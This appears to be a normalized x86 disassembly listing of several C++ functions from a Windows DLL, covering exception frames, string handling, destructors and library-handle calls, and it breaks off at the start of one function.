mov [ esp + 0x20 ] 0x0
call sub_100018b0
mov [ esp + 0xa8 ] 0x4
lea ecx [ edi + 0x34 ]
lea eax [ esp + 0x14 ]
cmp ecx eax
je r-xdata
push [ esp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x28 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
test edi edi
jne r-xdata
push [ esp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov [ esp + 0x44 ] 0xf
mov eax esi
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0xa8 ] 0xffffffff
cmp [ esp + 0x44 ] 0x10
jb r-xdata
sub_10017930
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c889
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
add ecx 0x18
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_10003a20
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100179b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e332
mov eax [ fs : 0x0 ]
push eax
sub esp 0x628
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x620 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x638 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ esp + 0x44 ] ebx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x78 ]
push 0x1
push eax
mov [ esp + 0x20 ] eax
call sub_100080c0
mov [ esp + 0x640 ] 0x0
lea ecx [ ebx - 0x3c ]
cmp [ esp + 0x80 ] 0x0
je r-xdata
sub esp 0x18
mov [ esp + 0x58 ] ecx
mov eax esp
mov [ esp + 0x28 ] esp
push eax
call sub_10017930
mov [ esp + 0x658 ] 0x2
mov [ esp + 0x658 ] 0x0
lea ecx [ esp + 0x78 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x640 ] 0x3
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
mov eax [ ebx - 0x3c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x7c ]
sub esp 0x18
mov esi esp
mov [ esp + 0x30 ] esp
mov [ esp + 0x2c ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x658 ] 0x1
push ebx
push [ esp + 0x30 ]
mov [ esp + 0x660 ] 0x0
call sub_10008410
add esp 0x20
mov edi eax
jmp r-xdata
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x50
call sub_100382c0
push eax
push rw-data
call esi
mov [ esp + 0x640 ] 0xffffffff
mov [ esp + 0x78 ] r--data
mov [ esp + 0x640 ] 0xc
cmp [ esp + 0x94 ] 0x0
jbe r-xdata
mov edi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x51
call sub_100382c0
push eax
push rw-data
call esi
mov [ esp + 0x640 ] 0xffffffff
cmp [ esp + 0x98 ] 0x8
jb r-xdata
cmp [ esp + 0x98 ] 0x8
lea eax [ esp + 0x84 ]
cmovae eax [ esp + 0x84 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x38 ] eax
jne r-xdata
mov ecx 0x27
call sub_100382c0
push eax
push rw-data
call esi
xor eax eax
mov [ esp + 0x98 ] 0x7
mov [ esp + 0x84 ] ax
mov eax edi
mov [ esp + 0x94 ] 0x0
mov ecx [ esp + 0x638 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x620 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x84 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x3c ] eax
jne r-xdata
mov ecx 0x52
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ esp + 0x74 ] 0x8
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x60 ]
cmovae eax [ esp + 0x60 ]
push eax
call [ GetModuleHandleW@IAT ]
mov esi eax
call [ GetLastError@IAT ]
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x640 ] 0x4
lea eax [ esp + 0xcc ]
push esi
push ebx
push eax
call sub_10018080
add esp 0xc
cmp [ esp + 0xcc ] 0x0
jne r-xdata
mov ecx 0x53
call sub_100382c0
push eax
push rw-data
call esi
lea ecx [ esp + 0xcc ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xd0 ]
push eax
lea ecx [ esp + 0x50 ]
call sub_10005470
test esi esi
je r-xdata
mov esi [ esp + 0x10 ]
lea eax [ esp + 0xcc ]
push esi
push [ esp + 0x18 ]
push eax
call sub_10018080
add esp 0xc
cmp [ esp + 0xcc ] 0x0
jne r-xdata
push esi
call [ FreeLibrary@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0xcc ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
call [ GetLastError@IAT ]
push [ esp + 0x3c ]
mov esi eax
lea eax [ esp + 0xd0 ]
push edi
push eax
call sub_10018080
add esp 0xc
cmp [ esp + 0xcc ] 0x0
jne r-xdata
push [ esp + 0x38 ]
lea eax [ esp + 0xd0 ]
push edi
push eax
call sub_10018080
add esp 0xc
cmp [ esp + 0xcc ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xd0 ]
push eax
lea ecx [ esp + 0x50 ]
call sub_10005470
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
push 0x1
push esi
push eax
call sub_10007990
mov [ esp + 0x658 ] 0x7
mov [ esp + 0x658 ] 0x4
lea ecx [ esp + 0xb4 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x640 ] 0x8
lea ecx [ esp + 0x48 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x640 ] 0x4
cmp [ esp + 0xb0 ] 0x10
jb r-xdata
lea ecx [ esp + 0xcc ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
lea ecx [ esp + 0xcc ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
lea eax [ esp + 0xcc ]
push ecx
push eax
lea ecx [ esp + 0x50 ]
call sub_10005470
jmp r-xdata
mov [ esp + 0xb0 ] 0xf
mov [ esp + 0xac ] 0x0
mov [ esp + 0x9c ] 0x0
push [ esp + 0x9c ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xd0 ]
push eax
lea ecx [ esp + 0x50 ]
call sub_10005470
push esi
push [ esp + 0x18 ]
lea eax [ esp + 0xd4 ]
push eax
call sub_10018080
add esp 0xc
cmp [ esp + 0xcc ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
lea eax [ esp + 0xcc ]
push ecx
push eax
lea ecx [ esp + 0x50 ]
call sub_10005470
jmp r-xdata
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x640 ] 0x9
test esi esi
je r-xdata
xor esi esi
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x44 ]
add eax 0xffffffc4
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
add ecx eax
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
lea ecx [ esp + 0xcc ]
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov [ esp + 0x640 ] 0x4
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x640 ] 0x4
sub esp 0x18
mov ecx [ esp + 0x30 ]
mov eax esp
mov [ esp + 0x30 ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ esp + 0x658 ] 0xa
mov [ esp + 0x658 ] 0x4
mov ecx esi
call sub_100190c0
push 0xffffffff
push 0x0
lea eax [ esp + 0x50 ]
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
lea ecx [ esp + 0x24 ]
push eax
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
call sub_100018b0
mov [ esp + 0x640 ] 0xb
lea ecx [ esi + 0x34 ]
lea eax [ esp + 0x1c ]
cmp ecx eax
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xd0 ]
push eax
lea ecx [ esp + 0x50 ]
call sub_10005470
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
push 0x1
push esi
push eax
call sub_10007990
mov [ esp + 0x658 ] 0x5
mov [ esp + 0x658 ] 0x4
lea ecx [ esp + 0xcc ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x640 ] 0x6
lea ecx [ esp + 0x48 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x640 ] 0x4
cmp [ esp + 0xc8 ] 0x10
jb r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
test esi esi
jne r-xdata
push [ esp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0xc8 ] 0xf
mov [ esp + 0xc4 ] 0x0
mov [ esp + 0xb4 ] 0x0
jmp r-xdata
push [ esp + 0xb4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
mov edi [ eax + 0x8 ]
add edi esi
xor edi edi
jmp r-xdata
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x640 ] 0x0
cmp [ esp + 0x74 ] 0x8
jb r-xdata
push [ esp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x640 ] 0x3
cmp [ esp + 0x5c ] 0x10
jb r-xdata
xor eax eax
mov [ esp + 0x74 ] 0x7
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] ax
push [ esp + 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100180a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e383
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x28 ]
mov ebx eax
xor edx edx
mov [ ebp + 0x8 ] edx
mov ecx [ ebx + 0x34 ]
sub ecx [ ebx + 0x30 ]
sar ecx 0x3
test ecx ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ ecx ]
mov eax [ rw-data ]
push eax
mov eax [ esi - 0x2c ]
mov ecx [ eax + 0xc ]
add ecx 0xffffffd4
add ecx esi
call sub_10007eb0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx 0x54
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov eax [ ebx + 0x34 ]
mov edx [ ebp + 0x8 ]
sub eax [ ebx + 0x30 ]
inc edx
mov esi [ ebp - 0x10 ]
sar eax 0x3
mov [ ebp + 0x8 ] edx
cmp edx eax
jb r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax ]
sub esp 0x18
mov edi eax
mov esi esp
mov [ ebp - 0x18 ] esp
sub esp 0x18
mov ecx esp
mov [ ebp - 0x1c ] esp
push ecx
mov ecx [ ebp - 0x10 ]
add ecx 0xffffffd4
call sub_10009aa0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x30 ]
mov edi [ eax + edx * 8 ]
mov ecx edi
mov [ ebp - 0x14 ] edi
mov eax [ edi ]
call [ eax ]
movzx esi [ esi - 0x10 ]
mov ecx eax
mov eax [ ecx ]
mov eax [ eax ]
call eax
movzx eax al
cmp eax esi
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ ebx + 0x34 ]
cmp eax ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov esi [ ebp - 0x14 ]
mov edi [ rw-data ]
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x2
test esi esi
je r-xdata
mov ecx 0x27
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
lea edx [ eax + 0x8 ]
cmp edx ecx
je r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax - 0x2c ]
add eax 0xffffffd4
mov ecx [ ecx + 0x8 ]
add ecx eax
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
add [ ebx + 0x34 ] 0xfffffff8
mov ecx esi
mov eax [ esi ]
call [ eax + 0x4 ]
lea esp [ esp ]
cmp [ eax ] esi
je r-xdata
jmp r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ edi ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ edx ]
mov [ edx - 0x8 ] eax
mov eax [ edx + 0x4 ]
mov [ edx - 0x4 ] eax
add edx 0x8
cmp edx ecx
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ ebp - 0x34 ]
call sub_100019e0
mov [ ebp - 0x4 ] 0x3
lea ecx [ esi + 0x34 ]
lea eax [ ebp - 0x34 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] 0x0
test esi esi
jne r-xdata
push [ ebp - 0x34 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
mov eax [ eax + 0x8 ]
add eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10018370
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
mov eax [ ecx - 0xc ]
push esi
lea esi [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov edx [ eax + 0x4 ]
lea ecx [ edx - 0xc ]
mov [ edx + esi - 0x4 ] ecx
mov [ esi + 0xc ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100183d0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
lea esi [ ecx - 0x8 ]
mov [ esi ] r--data
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10018410
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e3ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0xc ]
mov [ edx + esi - 0x4 ] eax
mov [ esi + 0x4 ] 0xa
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_100184c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e3db
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x10 ] edx
mov eax [ edx - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x10 ] r--data
mov eax [ edx - 0x10 ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x10 ] r--data
mov eax [ edx - 0x10 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + edx - 0x14 ] eax
mov eax [ edx - 0x10 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + edx - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x10 ] r--data
mov eax [ edx - 0x10 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x14 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10018580
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx esi
call sub_100185b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100185b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e40b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov eax [ edx ]
lea esi [ edx + 0x10 ]
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x10 ] r--data
mov eax [ esi - 0x10 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x10 ] r--data
mov eax [ esi - 0x10 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x14 ] eax
mov eax [ esi - 0x10 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x10 ] r--data
mov eax [ esi - 0x10 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x14 ] eax
mov eax [ edx + 0x1c ]
mov [ edx + 0x18 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + edx + 0x1c ] r--data
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10018660
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x8000010a
jne r-xdata
cmp eax 0x8000000a
jne r-xdata
lea eax [ ecx - 0x44 ]
pop ebp
retn 0x4
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx - 0x44 ]
mov eax [ eax + 0xc ]
add eax 0xffffffbc
add eax ecx
pop ebp
retn 0x4
sub_10018690
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e4a2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x30 ] 0x0
lea ecx [ edi + 0x54 ]
mov [ edi ] r--data
mov [ edi + 0x50 ] r--data
mov [ ecx ] r--data
mov [ ebp - 0x34 ] edi
mov [ edi + 0x44 ] r--data
mov [ ebp - 0x4 ] 0x0
lea edx [ edi + 0x4c ]
mov eax [ edx + 0x4 ]
mov [ edx ] r--data
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x38 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
sub esp 0x8
mov [ ebp - 0x30 ] 0x3
call sub_10018410
mov [ ebp - 0x4 ] 0x3
mov eax [ edi ]
mov [ ebp - 0x30 ] 0x7
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov eax [ eax + 0x8 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x44 ]
mov [ ecx + edi - 0x4 ] eax
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x4c ]
mov [ ecx + edi - 0x4 ] eax
mov [ edi + 0x20 ] 0xf
mov [ edi + 0x1c ] 0x0
mov [ edi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x4
lea esi [ edi + 0x28 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
mov [ edi + 0x8 ] 0x1
mov [ edi + 0x24 ] 0x0
call sub_10018a80
mov ebx eax
mov [ ebp - 0x4 ] 0x6
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
push ebx
mov [ esi ] 0x0
call sub_10005010
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10018830
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x44 ]
mov ecx esi
call sub_10018860
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10018860
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e4db
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x44 ]
call sub_10018920
mov eax [ esi + 0x54 ]
lea edx [ esi + 0x64 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x10 ] r--data
mov eax [ edx - 0x10 ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x10 ] r--data
mov eax [ edx - 0x10 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + edx - 0x14 ] eax
mov eax [ edx - 0x10 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + edx - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x10 ] r--data
mov eax [ edx - 0x10 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x14 ] eax
mov eax [ esi + 0x50 ]
mov [ esi + 0x4c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x50 ] r--data
mov [ esi + 0x44 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10018920
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e516
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x44 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x44 ] r--data
mov eax [ esi - 0x44 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x44 ] r--data
mov eax [ esi - 0x44 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x44 ]
mov [ ecx + esi - 0x48 ] eax
mov eax [ esi - 0x44 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x4c ]
mov [ ecx + esi - 0x48 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ esi - 0x8 ] 0x10
jb r-xdata
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x24 ] 0x10
jb r-xdata
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x24 ] 0xf
mov [ esi - 0x28 ] 0x0
mov [ esi - 0x38 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100189f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c028
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov al [ ebp + 0x20 ]
mov [ esi + 0x24 ] al
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10018a80
push ebp
mov ebp esp
push 0xffffffff
